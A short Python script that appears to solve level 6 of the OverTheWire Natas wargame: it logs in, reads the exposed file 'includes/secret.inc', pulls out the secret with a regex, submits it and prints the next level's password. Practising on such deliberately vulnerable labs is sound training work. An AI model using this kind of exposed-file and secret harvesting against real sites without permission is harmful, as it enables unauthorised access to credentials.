import requests
import re

username = "natas6"
password = "<censored>"
url = "http://%s.natas.labs.overthewire.org/"  % username
source = "index-source.html"

session = requests.Session()
response = session.get(url,auth=(username,password))
print(response.text)
print("="*50)
response = session.get(url+source,auth=(username,password))
print(response.text)
print("="*50)

secret = "includes/secret.inc"
response = session.get(url+secret,auth=(username,password))
print(response.text)
print("="*50)

sec_pass = re.findall(r"[A-Z]{19}",response.text)[0]

response = session.post(url,data={"secret":sec_pass,"submit":"submit"},auth=(username,password))
pageContent = response.text
print(pageContent)
print("="*50)

# Just Code Printing
code = re.findall('The password for natas7 is (.*)', pageContent)[0]
print("The password for the next level is: " + code)